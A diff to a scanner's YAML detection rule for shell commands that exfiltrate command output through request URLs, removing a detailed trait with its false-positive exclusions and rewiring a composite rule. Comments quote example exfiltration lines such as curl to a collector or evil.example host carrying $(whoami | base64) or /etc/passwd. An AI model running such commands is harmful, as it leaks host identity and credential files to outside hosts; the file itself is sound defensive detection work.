@@ -1,144 +1,18 @@
 # Command output exfiltrated through request-URL interpolation.
 #
-# `curl http://<collector>/<id>_$(<command> | base64 -w0)` runs a local
-# command and embeds its (usually base64-wrapped) output into the URL path of
-# an outbound request, keyed by a per-attempt identifier: an out-of-band
-# collection channel that keeps the payload out of application logs. Observed
-# in Switchvox CVE-2026-9586 exploitation (Horizon3.ai, Aug 2026), where the
-# encoded command enumerated running processes; the same channel carries any
-# harvested value, from host fingerprints to signing keys.
+# A dynamic URL path is neutral: installers commonly select platform-specific
+# artifacts this way. Pair it with output piped to Base64 to infer a transport
+# chain such as `curl https://collector/id_$(whoami | base64 -w0)`.
 defaults:
   platforms: [unix, windows]
-  for: [shell, text, python, javascript, typescript]
+  for: [shell, powershell]
   attack: T1041
 
 traits:
-  - id: url-command-substitution
-    desc: URL embeds command substitution output
-    crit: suspicious
-    conf: 0.85
-    # A URL literal containing a $( ...) in its PATH/QUERY — command
-    # substitution smuggling data into a request URL means "execute this and
-    # send me the output". Requiring a `/` between the authority and the
-    # substitution keeps this to that shape: the destination host is a fixed
-    # literal and the substitution is exfiltrated data appended after it.
-    # Without that separator, `http://$(...)：PORT`-style URLs also matched —
-    # Kubernetes/cloud-native tooling routinely builds a *destination* address
-    # this way (Rook's create-dev-cluster.sh: `http://$(kubectl ... -o
-    # jsonpath='{.status.hostIP}'):30900` to reach its own Prometheus pod),
-    # which is dynamic service discovery, not exfiltration. Backtick is
-    # excluded from the continuation class so the match cannot cross a JS
-    # template-literal boundary into unrelated code that merely happens to
-    # call a minified `$(...)` helper (classnames/jQuery-style) shortly
-    # after an unrelated URL string — observed in sidebar_bookmarks.xpi's
-    # BrowsingStatsAppPanel bundle: `https://${t.host}` followed by
-    # `className:$("shrink-0", f.favicon)`.
-    if:
-      type: text
-      regex: 'https?://[^/''"`\s]{1,120}/[^''"`\n]{0,100}\$\([^''"`\n]{0,100}'
-    # Cross-platform asset selection, not exfiltration: release download URLs
-    # routinely interpolate `$(uname -m)`/`$(arch)`/`$(dpkg
-    # --print-architecture)` to pick an architecture- or OS-specific artifact
-    # (hashicorp/nomad's CNI install line, and every kubectl/helm/rustup-style
-    # installer). Excluded only when the substitution both runs a platform
-    # probe and resolves to an arch/OS token, so `$(uname -a | base64)` sent
-    # to a collector still matches.
-    unless:
-      # A security scanner's own tests embed exfil payloads as fixture
-      # strings: agent-audit-kit's test_llm_sql_rce.py writes
-      # `curl http://x/$(whoami)` into tmp files to prove its SQL-RCE rule
-      # fires. The scanner context marks the tool that hunts this pattern.
-      - id: well-known/tool/detection/agent-audit-kit::scanner-context
-    not:
-      # jQuery documentation often embeds receiver syntax in tutorial URLs,
-      # for example `.../Introducing_$(document).ready()`. In JavaScript this
-      # is a selector call followed by a method access, not shell command
-      # substitution and therefore cannot carry command output in the URL.
-      - regex: '\$\((document|window|this)\)\s*\.\s*[A-Za-z_$]'
-      # Svelte store access compiles `$page` to an empty `$()` helper call.
-      # This appears directly in an interpolation (`${$().url...}`) or later
-      # inside one (`${encodeURIComponent(((model=$())...}`). An empty `$()`
-      # is invalid shell command substitution, so it cannot execute or place
-      # command output in the URL.
-      - regex: '\$\(\)'
-      - regex: '(?i)\$\([^\n]{0,60}\b(uname|arch|dpkg|lsb_release|getconf|go\s+env)\b[^\n]{0,80}\b(aarch64|x86_64|arm64|amd64|armv[67]l?|i[36]86|ppc64le|s390x|darwin|linux|windows)\b'
-      # The un-cased form of the same idiom: `uname -m` (or `arch`,
-      # `dpkg --print-architecture`, ...) resolves to an arch token by
-      # definition, so a release URL does not also need to spell the token
-      # out in a nearby case/if block. Anchored to a BARE probe -- nothing
-      # piped or chained inside the parens -- so `$(uname -a | base64 -w0)`
-      # (an actual recon-to-URL exfil channel) still matches the primary
-      # rule. containerd's script/setup/install-runc does exactly this:
-      # `.../crun-${CRUN_VERSION}-static-$(uname -m)`.
-      - regex: '(?i)\$\((uname(\s+-[a-z]+)?|arch|dpkg\s+--print-architecture|lsb_release\s+-[a-z]+|getconf\s+\w+|go\s+env\s+\w+)\)'
-      # The Kubernetes-ecosystem analogue: a version-negotiation query
-      # parameter (self-documenting by name, e.g. `?k8s-version=`) whose
-      # value is the tool's own version string, used by a manifest server to
-      # pick the right variant -- not harvested data. Weave Net's official
-      # CNI install command (`kubectl apply -f
-      # ".../k8s/net?k8s-version=$(kubectl version | base64 | tr -d '\n')"`)
-      # is the canonical example, copied into countless Kubernetes CI
-      # scripts including Rook's tests/scripts/kubeadm.sh.
-      - regex: '(?i)[?&][\w-]*version=.{0,4}\$\((kubectl|docker|helm|oc)\s+version\b'
-      # RFC 2606/6761 reserve `.example`, `.invalid` and `.test` (and
-      # example.com/org/net) precisely so that samples cannot reach anything:
-      # `https://evil.example/$(cat /etc/passwd)` is a fixture, and
-      # agent-glovebox's classifier corpus is built out of them.
-      - regex: '(?i)https?://[^/\s"''`]{0,60}\.(example|invalid|test)([:/]|$)'
-      - regex: '(?i)https?://([^/\s"''`]{0,40}\.)?example\.(com|org|net)\b'
-      # A loopback destination is not an exfiltration channel: the request
-      # never leaves the host, so whatever the substitution produced went to
-      # the script's own service. Test harnesses that drive a local API build
-      # the URL this way -- slskdN's tests/scripts/test-swarm.sh posts to
-      # `http://localhost:$(get_port)/api/v0/...`, where the substitution
-      # supplies the port the server was started on.
-      - regex: '(?i)https?://(localhost|127(\.\d{1,3}){3}|\[::1\]|0\.0\.0\.0)([:/]|$)'
-      # Repository metadata, not harvested output: CI download URLs carry the
-      # commit they are fetching (`.../tar.gz/${GITHUB_SHA:-$(git rev-parse HEAD)}`).
-      - regex: '\$\(\s*git\s'
-      # kubectl (like the git case above) supplies the authority to reach,
-      # not data to smuggle: cluster dev-tooling routinely builds a local
-      # dashboard/service URL by querying the cluster's own state, e.g.
-      # `http://$(kubectl -n ns -o jsonpath='{.status.hostIP}' get pod ...)`
-      # -- Rook's create-dev-cluster.sh prints its Prometheus endpoint this
-      # way. The embedded quote in `-o jsonpath='...'` truncates the
-      # captured evidence to `$(kubectl -n `, so match on the bare call.
-      - regex: '(?i)\$\(\s*kubectl\b'
-      # `$(CNI_ARCH)` in a download URL is a Make variable expansion -- Make
-      # spells variables the way shell spells command substitution, and nomad's
-      # GNUmakefile builds its CNI plugin URL from one. Shell variables are
-      # `${VAR}`, so an all-caps token inside `$( )` is Make.
-      - regex: '\$\([A-Z][A-Z0-9_]{2,30}\)'
-      # The substitution IS the authority, supplying the host to talk to rather
-      # than data to smuggle, and a multi-word snake_case name is a function
-      # the script defines (`https://$(sbx_mcpgw_vm_host):$port/...`). Recon
-      # binaries -- whoami, hostname, id -- cannot match this shape.
-      - regex: 'https?://\$\([a-z][a-z0-9]*(_[a-z0-9]+){2,}\)'
-      # A kubectl/oc/minikube call is Kubernetes API service discovery --
-      # the substitution supplies the host to reach (a Pod/Service/Node IP
-      # via `-o jsonpath=`, or a `minikube service --url`-style endpoint),
-      # not harvested data. Rook's create-dev-cluster.sh builds
-      # `http://$(kubectl -n "ns" -o jsonpath='{.status.hostIP}' get pod ...)`
-      # this way to find its own test Prometheus instance. The primary regex
-      # above stops capturing at the first quote, so the match this `not:`
-      # sees is only the truncated prefix (`kubectl -n `) -- anchor on the
-      # command name itself rather than a flag further into the call.
-      - regex: '\$\(\$?\w*(minikube|kubectl|oc)\b'
-      # jQuery's `$()` call syntax is not shell substitution. Documentation
-      # URLs commonly append examples such as `$(document).ready()` directly
-      # to the URL path, leaving the URL and JavaScript call in one text run.
-      - regex: '\$\((document|window|this)\)\s*\.'
-
   - id: pipe-group-base64-stdout
     desc: Command output piped to base64
     crit: notable
     conf: 0.85
-    # Command output piped into base64 with no output file: wrapping it for
-    # transport rather than storage. Covers a `{ ...; }` group and the bare
-    # recon commands that turn up in one-line install-hook exfil -- `env`,
-    # `set`, `id`, `whoami`, `cat <file>`, `ls`. Real base64 use writes to a
-    # file (`base64 > x`) or decodes (`base64 -d`); piping fresh command output
-    # straight in is the exfil shape.
     if:
       type: text
       regex: '(\}|\benv|\bset|\bid|\bwhoami|\bcat\b[^|]{0,80}|\bls\b[^|]{0,40})\s*\|\s*base64\b'
@@ -151,9 +25,7 @@ composite_rules:
     desc: Command output base64-wrapped into URL
     crit: hostile
     conf: 0.95
-    # Command output encoded and shipped as part of a request URL: an
-    # exfiltration channel with no legitimate application purpose.
     all:
-      - id: url-command-substitution
+      - id: micro-behaviors/communications/http/url/build::shell-command-substitution-url-path
       - id: pipe-group-base64-stdout
     near_bytes: 512
